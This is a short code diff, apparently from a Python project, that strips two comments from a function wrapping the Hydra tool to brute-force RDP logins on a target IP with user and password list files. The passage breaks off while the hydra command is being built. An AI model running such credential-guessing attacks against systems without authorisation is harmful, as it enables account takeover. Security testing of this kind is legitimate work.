@@ -5,7 +5,6 @@ import os
 def brute_force_rdp(target_ip, users_file='users.txt', passwords_file='passwords.txt', output_file='hydra_rdp.log'):
     print(f"Starting brute force attack with Hydra on {target_ip} using RDP...")
 
-    # Check if input files exist
     if not os.path.exists(users_file):
         print(f"User file '{users_file}' not found.")
         return
@@ -13,7 +12,6 @@ def brute_force_rdp(target_ip, users_file='users.txt', passwords_file='passwords
         print(f"Password file '{passwords_file}' not found.")
         return
 
-    # Build the Hydra command
     command = [
         'hydra',
         '-L', users_file,
